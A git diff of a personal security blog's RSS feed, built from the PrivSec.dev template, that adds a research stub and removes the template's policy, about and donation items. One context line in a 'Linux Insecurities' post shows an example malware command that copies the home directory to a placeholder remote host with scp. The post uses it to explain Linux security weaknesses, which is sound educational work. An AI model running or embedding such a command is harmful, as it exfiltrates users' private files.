@@ -13,10 +13,10 @@
     <lastBuildDate>Sat, 15 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://loudrxiv.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Mark Maher Makram Ebeid Attalla</title>
-      <link>https://loudrxiv.github.io/about_me/</link>
+      <link>https://loudrxiv.github.io/about/</link>
       <pubDate>Mon, 27 Feb 2023 20:25:49 -0500</pubDate>
       
-      <guid>https://loudrxiv.github.io/about_me/</guid>
+      <guid>https://loudrxiv.github.io/about/</guid>
       <description>This website is made by a fundamentally lazy individual (see header) to provide a brief overview on my public life!
 The focus is on: interests, research, and hobbies.
 This template was taken from my appreciation of the larger Privsec.dev website; though I am working to diverge from its origin little-by-little
@@ -1137,6 +1137,17 @@ Note that if you already have a PGP key with a passphrase, you can remove it by 
     </item>
     
     <item>
+      <title>My Research</title>
+      <link>https://loudrxiv.github.io/research/</link>
+      <pubDate>Wed, 03 Aug 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/research/</guid>
+      <description>What my research has been about&amp;hellip; </description>
+      <content:encoded><![CDATA[<h1 id="what-my-research-has-been-about">What my research has been about&hellip;</h1>
+]]></content:encoded>
+    </item>
+    
+    <item>
       <title>Badness Enumeration</title>
       <link>https://loudrxiv.github.io/posts/knowledge/badness-enumeration/</link>
       <pubDate>Wed, 27 Jul 2022 00:00:00 +0000</pubDate>
@@ -1515,20 +1526,6 @@ When you buy an Android phone, the device&amp;rsquo;s default operating system o
     </item>
     
     <item>
-      <title>Code of Conflict</title>
-      <link>https://loudrxiv.github.io/code/</link>
-      <pubDate>Mon, 18 Jul 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://loudrxiv.github.io/code/</guid>
-      <description>The development effort of PrivSec.dev is a very personal process compared to &amp;ldquo;traditional&amp;rdquo; ways of developing a community website. Your recommendations and ideas behind it will be carefully reviewed, often resulting in critique and criticism. Know that this happens because everyone involved wants to see the best possible solution for the overall success of PrivSec.dev.
-If however, anyone feels personally abused, threatened, or otherwise uncomfortable due to this process, that is not acceptable.</description>
-      <content:encoded><![CDATA[<p>The development effort of PrivSec.dev is a very personal process compared to &ldquo;traditional&rdquo; ways of developing a community website. Your recommendations and ideas behind it will be carefully reviewed, often resulting in critique and criticism. Know that this happens because everyone involved wants to see the best possible solution for the overall success of PrivSec.dev.</p>
-<p>If however, anyone feels personally abused, threatened, or otherwise uncomfortable due to this process, that is not acceptable. If so, please contact us at <a href="mailto:contact@privsec.dev">contact@privsec.dev</a> or the individual members, and they will work to resolve the issue to the best of their ability.</p>
-<p>As a maintainer or collaborator of PrivSec.dev, please strive to keep things civil and focused on the technical issues involved. We are all humans, and frustration can be high on both sides of the process. Try to keep in mind the immortal words of Bill and Ted: &ldquo;Be excellent to each other.&rdquo;</p>
-]]></content:encoded>
-    </item>
-    
-    <item>
       <title>Linux Insecurities</title>
       <link>https://loudrxiv.github.io/posts/linux/linux-insecurities/</link>
       <pubDate>Mon, 18 Jul 2022 00:00:00 +0000</pubDate>
@@ -1563,35 +1560,6 @@ There is already a very in-depth technical blog explaining the various security 
 <p><strong>Security by irrelevance does not work</strong>. Just because there are fewer users of your favorite operating system does not make it any safer.</p>
 <p>Ask yourself this: Would you ditch Windows for ReactOS considering that it is a lot less popular and is less targeted? Likewise, would you ditch Linux desktop when it becomes the mainstream solution for the BSDs or some niche operating systems just because they are less popular?</p>
 <p>Malware for Linux does exist, and it is not hard to make. It can be something as trivial as a shell script or binary executing <code>scp -r ~/ malware@xx.xx.xx.xx:/data</code>. Due to the lack of application sandboxing or an application permission model, your computer can be compromised the moment you execute a malicious binary, shell script, or install script with or without root and with or without an exploit. This is, of course, not to discount the fact that many exploits do exist on Linux just like on any other operating systems as well.</p>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>Privacy Policy</title>
-      <link>https://loudrxiv.github.io/privacy/</link>
-      <pubDate>Mon, 18 Jul 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://loudrxiv.github.io/privacy/</guid>
-      <description>PrivSec.dev as a project does not collect any personal information. We do not track you using cookies, collect your fingerprints, or use any tracking scripts.
-Hosting Provider We use Google Domains and Google DNS. We host our website on Netlify. We do not use Netlify assets optimization, so nothing is hosted on CloudFront.
-Netlify does store your IP address and access logs for less than 30 days. Please check out this link for their policy regarding this.</description>
-      <content:encoded><![CDATA[<p>PrivSec.dev as a project does not collect any personal information. We do not track you using cookies, collect your fingerprints, or use any tracking scripts.</p>
-<h2 id="hosting-provider">Hosting Provider</h2>
-<p>We use Google Domains and Google DNS. We host our website on Netlify. We do not use Netlify assets optimization, so nothing is hosted on CloudFront.</p>
-<p>Netlify does store your IP address and access logs for less than 30 days. Please check out <a href="https://www.netlify.com/gdpr-ccpa/">this link</a> for their policy regarding this. Their general privacy policy can be found <a href="https://www.netlify.com/gdpr-ccpa/">here</a>.</p>
-<p>We use <a href="https://www.netlify.com/products/analytics/">Netlify Analytics</a> to analyze the access logs stored by Netlify. This information is not shared with any third parties.</p>
-<h2 id="software">Software</h2>
-<p>We use <a href="https://gohugo.io/">Hugo</a> to build our website. Hugo has <a href="https://gohugo.io/about/hugo-and-gdpr/">additional privacy settings</a> for GDPR compliance, and we configure it to be as privacy friendly as possible.</p>
-<p>Services like Disqus, Instagram, and Google Analytics are disabled. We do link to Twitter, Vimeo and Youtube in our blogs, and we turn on &ldquo;enableDNT&rdquo; and &ldquo;privacyEnhanced&rdquo; for those services.</p>
-<h2 id="git-repository">Git Repository</h2>
-<p>We use GitHub to host our repository. In order to contribute to our website or to open a GitHub discussion, you will need a GitHub account.</p>
-<p>For the Privacy policy of GitHub, please check out <a href="https://docs.github.com/en/site-policy/privacy-policies/github-privacy-statement">this link</a>.</p>
-<h2 id="matrix">Matrix</h2>
-<p>We use Matrix as our primary communication method. Since Matrix is a Federated protocol, the privacy of our conversaion depends on that of your homeserver and the homeserver of your contact.</p>
-<p>You should not have any expectation of privacy for your conversations in our public room, as anyone (be it a person or a bot) can access all of your messages and log them. Even if you &ldquo;delete&rdquo; your messages, it is merely a redaction request to the participating homeservers in the room, and any of them could choose to ignore said request.</p>
-<p>Direct or private messages with individuals are end to end encrypted by default. However, the Matrix protocol does not provide any metadata protection, and homeserver admins know who you have been talking to, how often you talk to them, and so on.</p>
-<h2 id="email">Email</h2>
-<p>Our mail server is hosted by Tommy on his own Dedicated Server colocated in the United Kingdom. Many of us use our @privsec.dev email as an alias and forward it to another email provider. The privacy of your emails with us is the same as with any other person you communicate with using this protocol - the hosting providers can read all of your conversations with us unless you are using PGP, and even when you use PGP there is no metadata protection.</p>
 ]]></content:encoded>
     </item>
     
@@ -1791,62 +1759,6 @@ For frozen distributions, package maintainers are expected to backport patches t
 <p>Some of its features include Tor Stream Isolation, <a href="https://www.whonix.org/wiki/Keystroke_Deanonymization#Kloak">keystroke anonymization</a>, <a href="https://www.kicksecure.com/wiki/Boot_Clock_Randomization">boot clock ranomization</a>, <a href="https://github.com/Whonix/swap-file-creator">encrypted swap</a>, hardened boot parameters, hardened kernel settings, and a <a href="https://www.kicksecure.com/wiki/Hardened_Malloc">hardened memory allocator</a>. One downside of Whonix is that it still inherits outdated packages with lots of downstream patching from Debian.</p>
 <p>Future versions of Whonix will likely include <a href="https://github.com/Whonix/apparmor-profile-everything">full system AppArmor policies</a> and a <a href="https://www.whonix.org/wiki/Sandbox-app-launcher">sandbox app launcher</a> to fully confine all processes on the system.</p>
 <p>Although Whonix is best used <a href="https://www.whonix.org/wiki/Qubes/Why_use_Qubes_over_other_Virtualizers">in conjunction with Qubes</a>, Qubes-Whonix has <a href="https://forums.whonix.org/t/qubes-whonix-security-disadvantages-help-wanted/8581">various disadvantages</a> when compared to other hypervisors.</p>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>About Us</title>
-      <link>https://loudrxiv.github.io/about/</link>
-      <pubDate>Sat, 16 Jul 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://loudrxiv.github.io/about/</guid>
-      <description>PrivSec.dev is made by a group of enthusiastic individuals looking to provide practical privacy and security advice for the end user. We are security researchers, developers, system administrators&amp;hellip; generally people with technical knowledge and work in the field.
-We focus on in-depth system configuration, security analysis, and software/hardware recommendations. Our site is based on technical merits, not ideologies and politics.
-Also, to avoid any confusion, we are not affiliated, associated or in any way connected with the PrivSec Global Conference.</description>
-      <content:encoded><![CDATA[<p>PrivSec.dev is made by a group of enthusiastic individuals looking to provide practical privacy and security advice for the end user. We are security researchers, developers, system administrators&hellip; generally people with technical knowledge and work in the field.</p>
-<p>We focus on in-depth system configuration, security analysis, and software/hardware recommendations. Our site is based on technical merits, not ideologies and politics.</p>
-<p>Also, to avoid any confusion, we are not affiliated, associated or in any way connected with the PrivSec Global Conference.</p>
-<hr>
-<h3 id="tommy">Tommy</h3>
-<p>Benevolent dictator for life @PrivSec.dev. System Administrator.</p>
-<p><strong>Website</strong>: <a href="https://tommytran.io">tommytran.io</a><br>
-<strong>Matrix</strong>: <a href="https://matrix.to/#/@tommy:arcticfoxes.net">@tommy:arcticfoxes.net</a><br>
-<strong>Email</strong>: <a href="mailto:contact@tommytran.io">contact@tommytran.io</a></p>
-<h3 id="randomhydrosol">Randomhydrosol</h3>
-<p>PrivSec.dev Administrator. Security Researcher. Friendliest Indian tech support on the planet Earth.</p>
-<p><strong>Matrix</strong>: <a href="https://matrix.to/#/@randomhydrosol:arcticfoxes.net">@randomhydrosol:arcticfoxes.net</a></p>
-<h3 id="madaidan">Madaidan</h3>
-<p>Security Researcher. Whonix developer. Uses Firefox, Telegram, and Linux against his own advice like a hypocrite.</p>
-<p><strong>Website</strong>: <a href="https://madaidans-insecurities.github.io">madaidans-insecurities.github.io</a><br>
-<strong>Matrix</strong>: <a href="https://matrix.to/#/@madaidan.:matrix.org">@madaidan.:matrix.org</a></p>
-<h3 id="akc3n">akc3n</h3>
-<p>Just an ordinary human that loves to learn, solve puzzles, and eat food.</p>
-<p><strong>Website</strong>: <a href="https://akc3n.page">akc3n.page</a></p>
-<h3 id="wj25czxj47bu6q">wj25czxj47bu6q</h3>
-<p>A nerd who can&rsquo;t stop going down rabbit holes. Very much a perfectionist.</p>
-<p><strong>Website:</strong> <a href="https://wanderingcomputerer.gitlab.io">Wandering Computerer</a><br>
-<strong>Matrix:</strong> <a href="https://matrix.to/#/@wj25czxj47bu6q:arcticfoxes.net">@wj25czxj47bu6q:arcticfoxes.net</a></p>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>Donate</title>
-      <link>https://loudrxiv.github.io/donate/</link>
-      <pubDate>Sat, 16 Jul 2022 00:00:00 +0000</pubDate>
-      
-      <guid>https://loudrxiv.github.io/donate/</guid>
-      <description>The domain costs us $12/year to renew from Google. We got our repository hosted for free on GitHub. We got our site hosted $10/month with Netlify. It costs Tommy ~$20/month to run the mail server, but that server is used for a bunch of his projects, not just PrivSec, and we doubt it will be used that much anyways. The point is, this website does not cost much to run, and as such we will not be accepting donation as a project.</description>
-      <content:encoded><![CDATA[<p>The domain costs us $12/year to renew from Google. We got our repository hosted for free on GitHub. We got our site hosted $10/month with Netlify. It costs Tommy ~$20/month to run the mail server, but that server is used for a bunch of his projects, not just PrivSec, and we doubt it will be used that much anyways. The point is, this website does not cost much to run, and as such we will not be accepting donation as a project.</p>
-<p>The real cost is the time and energy we put into writing, testing, and fact checking the content. Some of our members may want to accept donation, and you can donate to them individually.</p>
-<h3 id="randomhydrosol">Randomhydrosol</h3>
-<p><strong>Bitcoin</strong>: <code>bc1qchel9lzhuv3ayfp58yfdu7sxsjw2svgugtvj4v</code><br>
-<strong>Monero</strong>: <code>49yB5DPXK9TJVj5Jq5DkvrXd4wkFnoeC56mPED85bf5wHTUYmSyoYFEbVyyTciKzjFTo1kxMJMiCpLwuR96fT2NWS1hPVFG</code></p>
-<h3 id="akc3n">akc3n</h3>
-<p><strong>PayPal</strong>: <code>https://paypal.me/akc3n</code></p>
-<hr>
-<p>Alternatively, please consider donating to the projects below. These are projects which we rely on for our own digital safety and recommend to our readers. They are vital for the privacy, security, and safety of thousands of people.</p>
-<h3 id="grapheneos">GrapheneOS</h3>
-<p><strong>Donation Link</strong>: <a href="https://grapheneos.org/donate">grapheneos.org/donate</a></p>
 ]]></content:encoded>
     </item>
     
